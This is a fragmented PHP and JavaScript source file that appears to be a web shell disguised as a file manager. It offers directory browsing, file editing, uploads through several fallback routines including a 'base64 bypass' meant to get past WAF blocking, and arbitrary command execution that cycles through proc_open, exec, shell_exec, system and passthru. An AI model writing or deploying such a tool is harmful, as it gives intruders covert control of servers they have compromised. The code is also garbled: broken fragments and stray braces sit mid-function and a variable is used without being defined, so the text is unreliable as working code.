function sanitizePath($path) {
    $path = str_replace(['../', '..\\'], '', $path);
    $path = str_replace('\\', '/', $path);
    
    if (preg_match('/^[A-Z]:\//i', $path)) {
        return $path;
    }
    
    if (file_exists($path)) {
        $realPath = realpath($path);
        if ($realPath !== false) {
            return str_replace('\\', '/', $realPath);
        }
    }
    
    return $path;
}

function isBlockedFile($filename) {
    global $blocked_extensions;
    foreach ($blocked_extensions as $ext) {
        if (stripos($filename, $ext) !== false) {
            return true;
        }
    }
    return false;
}

function formatBytes($bytes, $precision = 2) {
    $units = ['B', 'KB', 'MB', 'GB', 'TB'];
    $bytes = max($bytes, 0);
    $pow = floor(($bytes ? log($bytes) : 0) / log(1024));
    $pow = min($pow, count($units) - 1);
    $bytes /= pow(1024, $pow);
    return round($bytes, $precision) . ' ' . $units[$pow];
}

function listDirectory($dir) {
    $items = [];
    
    if (!is_dir($dir)) {
        return ['error' => 'Not a directory', 'items' => []];
    }
    
    if (!is_readable($dir)) {
        return ['error' => 'Directory is not readable. Permission denied.', 'items' => []];
    }
    
    $files = @scandir($dir);
    
    if ($files === false) {
        return ['error' => 'Cannot read directory. Check permissions.', 'items' => []];
    }
    
    foreach ($files as $file) {
        if ($file == '.' || $file == '..') continue;
        
        $fullPath = $dir . DIRECTORY_SEPARATOR . $file;
        $isDir = is_dir($fullPath);
        
        if (!@file_exists($fullPath)) continue;
        
        $items[] = [
            'name' => $file,
            'path' => str_replace('\\', '/', $fullPath),
            'is_dir' => $isDir,
            'size' => $isDir ? 0 : @filesize($fullPath),
            'size_formatted' => $isDir ? '-' : formatBytes(@filesize($fullPath) ?: 0),
            'permissions' => @substr(sprintf('%o', @fileperms($fullPath)), -4) ?: '0000',
            'modified' => @date('Y-m-d H:i:s', @filemtime($fullPath)) ?: 'Unknown',
            'icon' => $isDir ? '📁' : getFileIcon($file)
        ];
    }
    
    usort($items, function($a, $b) {
        if ($a['is_dir'] != $b['is_dir']) {
            return $a['is_dir'] ? -1 : 1;
        }
        return strcasecmp($a['name'], $b['name']);
    });
    
    return ['items' => $items];
}

        'file_get_contents_put',

    ];
    
    foreach ($methods as $method) {

        $content = @file_get_contents($source['tmp_name']);
        if ($content !== false && @file_put_contents($targetPath, $content) !== false) {

}

function uploadMethod_fopen_fwrite($targetPath, $source) {
    if (isset($source['tmp_name']) && file_exists($source['tmp_name'])) {
        $sourceHandle = @fopen($source['tmp_name'], 'rb');
        $targetHandle = @fopen($targetPath, 'wb');
        
        if ($sourceHandle && $targetHandle) {
            while (!feof($sourceHandle)) {
                @fwrite($targetHandle, fread($sourceHandle, 8192));
            }
            @fclose($sourceHandle);
            @fclose($targetHandle);
            return ['success' => true, 'message' => 'Uploaded successfully'];
        }
    }
    return ['success' => false];
}

function uploadMethod_file_get_contents_put($targetPath, $source) {
    if (isset($source['tmp_name'])) {
        $content = @file_get_contents($source['tmp_name']);
        if ($content !== false) {
            $fp = @fopen($targetPath, 'w');
            if ($fp) {
                @fwrite($fp, $content);
                @fclose($fp);
                return ['success' => true, 'message' => 'Uploaded successfully'];
            }
        }
    }
    return ['success' => false];
}

function uploadMethod_curl_method($targetPath, $source) {
    if (isset($source['tmp_name']) && function_exists('curl_init')) {
        $ch = @curl_init('file://' . $source['tmp_name']);
        $fp = @fopen($targetPath, 'wb');
        
        if ($fp && $ch) {
            @curl_setopt($ch, CURLOPT_FILE, $fp);
            @curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
            
            $success = @curl_exec($ch);
            @curl_close($ch);
            @fclose($fp);
            
            if ($success && file_exists($targetPath)) {
                return ['success' => true, 'message' => 'Uploaded successfully'];
            }
        }
    }
    return ['success' => false];
}

function executeCommand($command, $workingDir = null) {

    $disabledFunctions = getDisabledFunctions();
    
    // Set working directory
    if ($workingDir === null) {
        $workingDir = getcwd();
    }
    
    $availableFunctions = [
        'proc_open' => checkFunctionAvailable('proc_open'),
        'shell_exec' => checkFunctionAvailable('shell_exec'),
        'exec' => checkFunctionAvailable('exec'),
        'system' => checkFunctionAvailable('system'),
        'passthru' => checkFunctionAvailable('passthru')
    ];
    
    if (!array_filter($availableFunctions)) {
        return [
            'output' => "❌ All command execution functions are disabled.\n\nDisabled: " . implode(', ', $disabledFunctions),
            'os' => $isWindows ? 'Windows' : 'Linux/Unix',
            'success' => false
        ];
    }
    
    // PRIORITY 1: proc_open
    if ($availableFunctions['proc_open']) {
        $descriptorspec = [
            0 => ["pipe", "r"],
            1 => ["pipe", "w"],
            2 => ["pipe", "w"]
        ];
        
        if ($isWindows) {
            $fullCommand = "cmd.exe /c \"cd /d " . escapeshellarg($workingDir) . " && " . $command . "\"";
        } else {
            $fullCommand = "cd " . escapeshellarg($workingDir) . " && " . $command . " 2>&1";
        }
        
        $process = @proc_open($fullCommand, $descriptorspec, $pipes, $workingDir);
        
        if (is_resource($process)) {
            fclose($pipes[0]);
            $output = stream_get_contents($pipes[1]);
            fclose($pipes[1]);
            $errors = stream_get_contents($pipes[2]);
            fclose($pipes[2]);
            $returnCode = proc_close($process);
            
            $finalOutput = $output;
            if (!empty($errors)) {
                $finalOutput .= "\n" . $errors;
            }
            
            if (empty($finalOutput)) {
                $finalOutput = $returnCode === 0 ? 
                    "Command executed (no output)" : 
                    "Command failed (exit code: " . $returnCode . ")";
            }
            
            return [
                'output' => $finalOutput,
                'os' => $isWindows ? 'Windows' : 'Linux/Unix',
                'success' => $returnCode === 0,
                'exit_code' => $returnCode
            ];
        }
    }
    
    // PRIORITY 2: exec
    if ($availableFunctions['exec']) {
        $outputArray = [];
        $returnVar = -1;
        
        if ($isWindows) {
            @exec("cd /d " . escapeshellarg($workingDir) . " && " . $command . " 2>&1", $outputArray, $returnVar);
        } else {
            @exec("cd " . escapeshellarg($workingDir) . " && " . $command . " 2>&1", $outputArray, $returnVar);
        }
        
        $output = implode("\n", $outputArray);
        
        if (empty($output)) {
            $output = $returnVar === 0 ? 
                "Command executed (no output)" : 
                "Command failed (exit code: " . $returnVar . ")";
        }
        
        return [
            'output' => $output,
            'os' => $isWindows ? 'Windows' : 'Linux/Unix',
            'success' => $returnVar === 0,
            'exit_code' => $returnVar
        ];
    }
    
    // PRIORITY 3: shell_exec
    if ($availableFunctions['shell_exec']) {
        if ($isWindows) {
            $output = @shell_exec("cd /d " . escapeshellarg($workingDir) . " && " . $command . " 2>&1");
        } else {
            $output = @shell_exec("cd " . escapeshellarg($workingDir) . " && " . $command . " 2>&1");
        }
        
        if ($output === null || trim($output) === '') {
            $output = "Command executed (no output)";
        }
        
        return [
            'output' => $output,
            'os' => $isWindows ? 'Windows' : 'Linux/Unix',
            'success' => $output !== null,
            'exit_code' => null
        ];
    }
    
    // PRIORITY 4: system
    if ($availableFunctions['system']) {
        ob_start();
        
        if ($isWindows) {
            @system("cd /d " . escapeshellarg($workingDir) . " && " . $command . " 2>&1", $returnVar);
        } else {
            @system("cd " . escapeshellarg($workingDir) . " && " . $command . " 2>&1", $returnVar);
        }
        
        $output = ob_get_clean();
        
        if (empty($output)) {
            $output = $returnVar === 0 ? 
                "Command executed (no output)" : 
                "Command failed (exit code: " . $returnVar . ")";
        }
        
        return [
            'output' => $output,
            'os' => $isWindows ? 'Windows' : 'Linux/Unix',
            'success' => $returnVar === 0,
            'exit_code' => $returnVar
        ];
    }
    
    // PRIORITY 5: passthru
    if ($availableFunctions['passthru']) {
        ob_start();
        
        if ($isWindows) {
            @passthru("cd /d " . escapeshellarg($workingDir) . " && " . $command . " 2>&1", $returnVar);
        } else {
            @passthru("cd " . escapeshellarg($workingDir) . " && " . $command . " 2>&1", $returnVar);
        }
        
        $output = ob_get_clean();
        
        if (empty($output)) {
            $output = $returnVar === 0 ? 
                "Command executed (no output)" : 
                "Command failed (exit code: " . $returnVar . ")";
        }
        
        return [
            'output' => $output,
            'os' => $isWindows ? 'Windows' : 'Linux/Unix',
            'success' => $returnVar === 0,
            'exit_code' => $returnVar
        ];
    }
    
    return [
        'output' => 'No available method to execute commands',
        'os' => $isWindows ? 'Windows' : 'Linux/Unix',
        'success' => false
    ];
}

function sendJSON($data) {
    if (ob_get_level()) ob_end_clean();
    ob_start();
    header('Content-Type: application/json; charset=utf-8');
    header('X-Content-Type-Options: nosniff');
    header('Cache-Control: no-cache, must-revalidate');
    echo json_encode($data);
    ob_end_flush();
    exit;
}

            break;
            
        default:
            sendJSON(['success' => false, 'message' => 'Invalid action']);
    }
    exit;
}

        exit;

        async ajax(url, method, data, isFormData = false) {
            const options = {
                method: method,
                headers: isFormData ? {} : {'Content-Type': 'application/x-www-form-urlencoded'},
                body: isFormData ? data : new URLSearchParams(data)
            };

            if (!isFormData) {
                options.headers['X-Requested-With'] = 'XMLHttpRequest';
            }

            try {
                const response = await fetch(url, options);
                const text = await response.text();
                
                if (text.trim().startsWith('<!DOCTYPE') || text.trim().startsWith('<html')) {
                    console.error('Server returned HTML instead of JSON');
                    this.showAlert('Server blocked request (WAF). Try different method.', 'error');
                    return null;
                }
                
                try {
                    const result = JSON.parse(text);
                    
                    if (result.require_login) {
                        this.showLoginScreen();
                        return null;
                    }
                    
                    return result;
                } catch (parseError) {
                    console.error('JSON Parse Error:', parseError);
                    this.showAlert('Invalid response from server', 'error');
                    return null;
                }
                
            } catch (error) {
                console.error('AJAX Error:', error);
                this.showAlert('Network error: ' + error.message, 'error');
                return null;
            }
        },

            async login() {
                const password = document.getElementById('password').value;

                    await this.getInitialData();

                        </td>

                    `;

            },

            renderBreadcrumb(path) {
                path = path.replace(/\\/g, '/');
                
                let breadcrumb = `<a href="#" onclick="FM.loadFiles('${this.initialDir.replace(/\\/g, '/').replace(/'/g, "\\'")}'); return false;" title="Home"><i class="fas fa-home"></i></a>`;
                
                let parts;
                let currentPath = '';
                
                if (path.match(/^[A-Z]:/i)) {
                    const drive = path.substring(0, 2);
                    parts = path.substring(3).split('/').filter(p => p);
                    breadcrumb += ` <span>/</span> <a href="#" onclick="FM.loadFiles('${drive}/'); return false;">${drive}</a>`;
                    currentPath = drive + '/';
                } else {
                    parts = path.split('/').filter(p => p);
                    currentPath = '/';
                }
                
                parts.forEach((part, index) => {
                    currentPath += part;
                    if (index < parts.length - 1) {
                        currentPath += '/';
                    }
                    breadcrumb += ` <span>/</span> <a href="#" onclick="FM.loadFiles('${currentPath.replace(/'/g, "\\'")}'); return false;">${this.escapeHtml(part)}</a>`;
                    if (index === parts.length - 1) {
                        currentPath += '/';
                    }
                });
                
                document.getElementById('breadcrumb').innerHTML = breadcrumb;
            },

            async uploadFile() {
                const fileInput = document.getElementById('uploadFile');
                
                if (!fileInput.files.length) {
                    this.showAlert('Please select a file', 'error');
                    return;
                }
                
                const file = fileInput.files[0];
                
                this.showLoading();
                
                console.log('Trying base64 bypass method first...');
                const base64Result = await this.uploadFileBase64(file);
                
                if (base64Result && base64Result.success) {
                    this.hideLoading();
                    this.closeModal('uploadModal');
                    this.showAlert(`✅ Uploaded via: ${base64Result.method}`, 'success');
                    this.loadFiles(this.currentDir);
                    document.getElementById('uploadForm').reset();
                    return;
                }
                
                console.log('Base64 method failed, trying normal upload...');
                
                const formData = new FormData();
                formData.append('action', 'upload');
                formData.append('dir', this.currentDir);
                formData.append('file', file);
                
                try {
                    const response = await fetch(window.location.href, {
                        method: 'POST',
                        headers: {'X-Requested-With': 'XMLHttpRequest'},
                        body: formData
                    });
                    
                    const text = await response.text();
                    
                    if (text.trim().startsWith('<!DOCTYPE') || text.trim().startsWith('<html')) {
                        this.hideLoading();
                        this.closeModal('uploadModal');
                        this.showAlert('⚠️ Upload blocked by WAF', 'error');
                        return;
                    }
                    
                    const result = JSON.parse(text);
                    
                    this.hideLoading();
                    this.closeModal('uploadModal');
                    
                    if (result.success) {
                        this.showAlert(`✅ Uploaded via: ${result.method}`, 'success');
                        this.loadFiles(this.currentDir);
                        document.getElementById('uploadForm').reset();
                    } else {
                        this.showAlert('❌ Upload failed: ' + result.message, 'error');
                    }
                } catch (error) {
                    this.hideLoading();
                    this.closeModal('uploadModal');
                    this.showAlert('❌ Upload failed: ' + error.message, 'error');
                }
            },

            async uploadFileBase64(file) {
                return new Promise((resolve) => {
                    const reader = new FileReader();
                    
                    reader.onload = async (e) => {
                        const base64Data = e.target.result.split(',')[1];
                        
                        try {
                            const result = await this.ajax(window.location.href, 'POST', {
                                action: 'upload_base64',
                                dir: this.currentDir,
                                filename: file.name,
                                filedata: base64Data
                            });
                            
                            resolve(result);
                        } catch (error) {
                            resolve({ success: false, message: error.message });
                        }
                    };
                    
                    reader.onerror = () => {
                        resolve({ success: false, message: 'Failed to read file' });
                    };
                    
                    reader.readAsDataURL(file);
                });
            },

            async editFile(path, name) {
                this.currentEditPath = path;
                document.getElementById('editFileName').textContent = name;
                
                const ext = name.split('.').pop().toLowerCase();
                const modes = {
                    'php': 'php', 'js': 'javascript', 'html': 'html',
                    'css': 'css', 'json': 'json', 'xml': 'xml', 'sql': 'sql'
                };
                
                if (modes[ext]) {
                    this.editor.session.setMode(`ace/mode/${modes[ext]}`);
                } else {
                    this.editor.session.setMode('ace/mode/text');
                }
                
                this.showLoading();
                
                const result = await this.ajax(window.location.href, 'POST', {
                    action: 'read_file',
                    path: path
                });
                
                this.hideLoading();
                
                if (result && result.success) {
                    this.editor.setValue(result.content, -1);
                    document.getElementById('editModal').classList.add('active');
                } else {
                    this.showAlert('Error reading file', 'error');
                }
            },

            async executeCommand() {
                const command = document.getElementById('terminalInput').value.trim();
                
                if (!command) {
                    this.showAlert('Please enter a command', 'error');
                    return;
                }
                
                const output = document.getElementById('terminalOutput');
                output.innerHTML += `\n$ ${this.escapeHtml(command)}\n`;
                
                this.showLoading();
                
                const result = await this.ajax(window.location.href, 'POST', {
                    action: 'execute_command',
                    command: command,
                    current_dir: this.currentDir
                });
                
                this.hideLoading();
                
                if (result) {
                    if (result.success) {
                        output.innerHTML += this.escapeHtml(result.output) + '\n';
                        document.getElementById('osType').textContent = `(${result.os})`;
                    } else {
                        output.innerHTML += `Error: ${this.escapeHtml(result.output)}\n`;
                    }
                    
                    output.scrollTop = output.scrollHeight;
                }
                
                document.getElementById('terminalInput').value = '';
            },
